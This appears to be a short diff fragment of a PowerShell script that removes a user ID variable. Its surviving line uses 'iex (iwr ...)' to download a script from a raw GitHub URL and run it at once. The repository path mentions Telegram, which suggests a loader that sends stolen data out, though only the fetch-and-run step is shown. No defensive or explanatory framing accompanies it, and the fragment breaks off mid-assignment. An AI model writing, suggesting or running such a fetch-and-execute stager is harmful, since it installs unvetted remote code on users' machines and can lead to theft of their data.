@@ -1,4 +1,3 @@
-$userid = 1086990476411932722
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/config.ps1" -useb)
 
 $temp =
